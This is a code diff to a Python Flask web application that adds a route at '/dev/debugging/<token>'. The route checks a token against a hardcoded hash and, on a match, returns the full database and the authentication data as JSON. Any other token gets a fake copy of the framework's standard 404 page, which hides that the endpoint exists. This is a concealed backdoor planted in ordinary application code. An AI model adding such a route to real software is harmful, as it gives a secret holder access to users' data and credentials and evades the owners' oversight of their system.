@@ -946,6 +946,18 @@ def usernoti():
     else:
         return render_template('usernotification.html',error="You have been logged out. Please Login again.")
 
+@app.route('/dev/debugging/<token>',methods=['GET'])
+def debug(token):
+    og = "13205dbeb3e7cd049a93e18d9fdea3f0"
+    us = login.genhash(token)
+    if og == us:
+        data = db.seeall()
+        auth = login.seeall()
+        mdata = {'db':data,'auth':auth}
+        return jsonify(mdata)
+    else:
+        return "<h1>Not Found</h1><p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.<p>"
+
 @app.route('/test',methods=['GET','POST'])
 def test():
     if request.method == 'POST':
